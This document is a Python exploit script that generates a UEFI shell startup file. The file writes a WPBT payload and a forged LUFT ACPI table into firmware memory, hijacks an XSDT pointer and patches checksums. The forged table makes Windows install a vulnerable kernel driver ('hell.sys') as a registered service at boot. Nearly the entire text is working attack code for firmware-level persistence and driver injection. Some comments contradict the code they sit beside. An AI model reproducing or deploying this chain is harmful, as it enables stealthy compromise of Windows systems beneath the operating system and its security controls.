#!/usr/bin/env python3
#LUFT + WPBT uploader

import struct, pathlib
def dump(buf):
    for offs in range(0, len(buf), 16):
        chunk = buf[offs:offs+16]
        hexs  = " ".join(f"{b:02X}" for b in chunk)
        ascii = "".join(chr(b) if 32<=b<127 else "." for b in chunk)
        print(f"{offs:04X}  {hexs:<47}  {ascii}")
#wsmt 0fbfaeb2
#  constant addresses from dump. you can calculate this dinamically.
BIN_ADDR        = 0x000000000D654000          # 1 MiB RT-DATA region base. We allocate this with Shield.efi
XSDT_ADDR	= 0x000000000FBE2070
SRAT_OFFSET	= 0xa6
WPBT_HDR_ADDR   = 0x000000000FBE2070 + SRAT_OFFSET         # SRAT header to overwrite
WSMT_ADDR	= 0x000000000FBFAEB2

XSDT_LO_ADDR = XSDT_ADDR + 0x24 + 8*7 # slot-7  low dword (you can dinamically calculate this)
XSDT_HI_ADDR    = XSDT_LO_ADDR - 4          # slot-7 (WSMT) high dword
#mm 0x{XSDT_CSUM_ADDR:08X} -w 1 0x{new_csum:02X}
XSDT_CSUM_ADDR  = XSDT_ADDR + 9
OLD_XSDT_CSUM   = 0xAC
OLD_PTR_BYTES   = WSMT_ADDR.to_bytes(8, 'little')[4:] + WSMT_ADDR.to_bytes(8, 'little')[:4]   # original WSMT ptr
ALLOC_SIZE      = 0x100000              # 1 MiB reserved in RT-DATA
GAP_SIZE        = 0x1000                # 4 KiB gap after WPBT
# 

PAYLOAD_FILE    = "fdf318b1d1b7f0b6420c715e2798430ddb674f129dd6ab503a51a11e346f038b.bin"   # WPBT signed binary
PAYLOAD_DRIVER  = "vulndriver.sys"

ck8   = lambda b: (-sum(b) & 0xFF)
bsum  = lambda b:  sum(b) & 0xFF
align = lambda v,a: (v + a - 1) & ~(a - 1)

# read WPBT binary
wpbt_bin = pathlib.Path(PAYLOAD_FILE).read_bytes()
wpbt_sz  = len(wpbt_bin)

# choose LUFT address safely inside the 1 MiB block
wpbt_end  = align(wpbt_sz, 0x1000)
LUFT_ADDR = BIN_ADDR + wpbt_end + GAP_SIZE
assert LUFT_ADDR + 0x1000 <= BIN_ADDR + ALLOC_SIZE

# build WPBT ACPI header (length 0x34 fixed)
wpbt_hdr  = bytearray(b"WPBT")
wpbt_hdr += struct.pack("<I", 0x34) + b"\x01\x00"
wpbt_hdr += b"OEMVMW" + b"VMWUEFI "
wpbt_hdr += struct.pack("<I", 1)              # OEM rev
wpbt_hdr += b"AAAA" + struct.pack("<I", 0x40000)
wpbt_hdr += struct.pack("<I", wpbt_sz) + struct.pack("<Q", BIN_ADDR)
wpbt_hdr += b"\x01\x01\x00\x00"
wpbt_hdr[9] = ck8(wpbt_hdr)

#  CONFIG 
NAME      = b"hell"                     #  hell.sys
PAYLOAD = pathlib.Path(PAYLOAD_DRIVER).read_bytes()
flags     = b"\x01\x00\x00\x80"         # Win8+features
ENTRY_OFF = 0x30                        # where we reserve the 8-DWORD entry

#  HELPERS 
def align4(buf: bytearray):
    buf += b'\x00' * ((-len(buf)) & 3)

def dword4(x: bytes) -> int:
    return int.from_bytes(x.ljust(4,b'\0'), 'little')

#  BUILD LUFT HEADER + ENTRY SLOT 
luft  = bytearray(b"LUFT")
luft += struct.pack("<I", 0) + b"\x01\x00"     # length hole + rev
luft += b"LENOVO".ljust(6,b' ') + b"TC-M3G  "
luft += struct.pack("<I",0x1400)+b"TEST"+struct.pack("<I",0x00010013)
luft += flags
luft += struct.pack("<H", 1)                   # one entry

# offset array @0x2A
luft += struct.pack("<I", ENTRY_OFF) + b'\x00\x00'

# reserve 8 DWORDs for ENTRY
entry_start = len(luft)                        # should equal ENTRY_OFF
luft += b'\x00' * 0x20

#  FILENAME + PAYLOAD 
luft += NAME + b".sys\x00"
align4(luft)

file_off = len(luft)
luft += PAYLOAD
align4(luft)

#  EXTRAâ€DESCRIPTOR CHAIN (SERVICE creation) 

# 1) append the UTF-16LE key-path string
subkey_off = len(luft)
KEYPATH = (
    rf"\Registry\Machine\SYSTEM\CurrentControlSet\Services\2srvdriver"
).encode('utf-16le') + b'\x00\x00'
luft += KEYPATH
align4(luft)

# 2) append 5 Sub-Descriptors, record their offsets
def append_sub(name: bytes, typ: int, data: bytes) -> int:
    # Record exactly where the name starts
    off_name = len(luft)
    luft.extend(name)
    # Now pad *after* the name
    align4(luft)

    # Record exactly where the data starts
    off_data = len(luft)
    luft.extend(data)
    # Now pad *after* the data
    align4(luft)

    # Now build the descriptor struct with those saved offsets
    off_desc = len(luft)
    luft.extend(struct.pack(
        "<IIIIII",
        off_name,     # name_offset
        0,            # reserved
        typ,          # Registry type
        off_data,     # data_offset
        len(data),    # data_size
        1             # OpCode = SetValue
    ))
    align4(luft)
    return off_desc

# name, type, data for each value:

desc0 = append_sub(
    "DisplayName".encode('utf-16le') + b'\x00\x00',
    1,  # REG_SZ
    "POC Service".encode('utf-16le') + b'\x00\x00'
)
desc1 = append_sub(
    "ImagePath".encode('utf-16le') + b'\x00\x00',
    2,  # REG_EXPAND_SZ
    r"System32\drivers\hell.sys".encode('utf-16le') + b'\x00\x00' #needs to be a valid service exe
)

desc2 = append_sub(
    "Type".encode('utf-16le') + b'\x00\x00',
    4,  # REG_EXPAND_SZ
    r"0x10".encode('utf-16le') + b'\x00\x00'
    )
desc3 = append_sub(
    "Start".encode('utf-16le') + b'\x00\x00',
    4,  # REG_EXPAND_SZ
    r"0x10".encode('utf-16le') + b'\x00\x00'
    )
desc4 = append_sub(
    "ErrorControl".encode('utf-16le') + b'\x00\x00',
    4,  # REG_EXPAND_SZ
    r"0x10".encode('utf-16le') + b'\x00\x00'
    )

sub_list   = [desc0, desc1, desc2, desc3, desc4]
sub_count  = len(sub_list)           # = 3
flags_desc = 0                        # or 1 if you want to force-install

# Build the Descriptor Header with the correct count
desc_off = len(luft)
luft.extend(struct.pack(
    "<III",
    subkey_off,    # offset of the SERVICE key-path string
    flags_desc,    # reserved flags
    sub_count      # 
))
# Now exactly three pointers
for off in sub_list:
    luft.extend(struct.pack("<I", off))
align4(luft)

# Extra-list
exlist_off = len(luft)
luft.extend(struct.pack("<II",
    1,         # one descriptor
    desc_off   # pointer to your descriptor-header
))


pointer_index = 0           # 0 for desc0, 1 for desc1, 2 for desc2
header_bytes  = 4       # three 4-byte header fields
patch_off     = desc_off -0x10 + header_bytes + pointer_index * 4
patch_off_1     = desc_off -0x50 + header_bytes + pointer_index * 4
patch_off_2     = desc_off -0x80 + header_bytes + pointer_index * 4

# overwrite that 4-byte word with 0x10
struct.pack_into("<I", luft, patch_off, 0x1)#last (ErrorControl)
struct.pack_into("<I", luft, patch_off_1, 0x0)#medium (Start)
#struct.pack_into("<I", luft, patch_off_1, 0x2)#medium (Start)
struct.pack_into("<I", luft, patch_off_2, 0x1)#first (Type)
#struct.pack_into("<I", luft, patch_off_2, 0x10)#first (Type)


align4(luft)

# ENTRY layout (indices 0..7):
#   [0] filename_ptr
#   [1] install mode
#   [2] unused
#   [3] unused
#   [4] payload_size
#   [5] payload_offset
#   [6] extra_count
#   [7] extra_list_offset
"""
struct.pack_into("<IIIIIIII", luft, ENTRY_OFF,
    dword4(NAME),    # [0]
    1,               # [1]
    0,               # [2]
    0,               # [3]
    file_off,        # [4] <-- AND exactly here
    len(PAYLOAD),    # [5] <-- EXACTLY here
    sub_count,       # [6]
    exlist_off       # [7]
)
"""
struct.pack_into("<IIIIIIII", luft, ENTRY_OFF,
    dword4(NAME),    # [0]
    1,               # [1]
    0,               # [2]
    0,               # [3]
    0,        # [4]
    len(PAYLOAD),    # [5]
    file_off,       # [6]
    exlist_off       # [7]
)
print(f"File offset: {hex(file_off)}, File size: {hex(len(PAYLOAD))}")
#  FINALIZE LENGTH & CHECKSUM 
struct.pack_into("<I", luft, 0x04, len(luft))
luft[9] = 0
luft[9] = (-sum(luft) & 0xFF)

# compute new XSDT checksum
new_ptr   = b"\x00\x00\x00\x00" + struct.pack("<I", LUFT_ADDR & 0xFFFFFFFF)
delta     = (bsum(new_ptr) - bsum(OLD_PTR_BYTES)) & 0xFF
new_csum  = (OLD_XSDT_CSUM - delta) & 0xFF

#https://github.com/HackingThings/SignedUEFIShell/blob/main/Build_exploit.py
# create startup.nsh with mm commands
with open("startup.nsh", "w", newline="\r\n") as sh:
    sh.write("echo -off\n")

    # WPBT payload
    for off in range(0, wpbt_sz, 8):
        chunk = wpbt_bin[off:off+8].ljust(8, b"\x00")[::-1]
        sh.write(f"mm 0x{BIN_ADDR+off:08X} -w 8 0x{chunk.hex().upper()}\n")
    sh.write("echo WPBT payload uploaded\n\n")

    # WPBT header
    for i,b in enumerate(wpbt_hdr):
        sh.write(f"mm 0x{WPBT_HDR_ADDR+i:08X} -w 1 0x{b:02X}\n")
    sh.write("echo WPBT header patched\n\n")

    # LUFT blob
    for off, byte in enumerate(luft):               # write byte-by-byte
        sh.write(f"mm 0x{LUFT_ADDR+off:08X} -w 1 0x{byte:02X}\n")
    sh.write(f"echo LUFT ({len(luft)} bytes) uploaded at {LUFT_ADDR:08X}\n\n")

    # XSDT pointer swap
    sh.write(f"mm 0x{XSDT_HI_ADDR:08X} -w 4 0x00000000\n")
    sh.write(f"mm 0x{XSDT_LO_ADDR:08X} -w 4 0x{LUFT_ADDR & 0xFFFFFFFF:08X}\n")


    # XSDT checksum
    sh.write(f"mm 0x{XSDT_CSUM_ADDR:08X} -w 1 0x{new_csum:02X}\n")
    sh.write(f"echo XSDT checksum fixed (0x{new_csum:02X})\n\n")

    sh.write("fs0:\\EFI\\Boot\\bootx64.dat\n")

print("startup.nsh generated")
#dump(luft)

mode = int.from_bytes(luft[ENTRY_OFF+4:ENTRY_OFF+8], 'little')
print(f"ENTRY_MODE = 0x{mode:08X}  {'OK' if mode==1 else 'BROKEN'}")
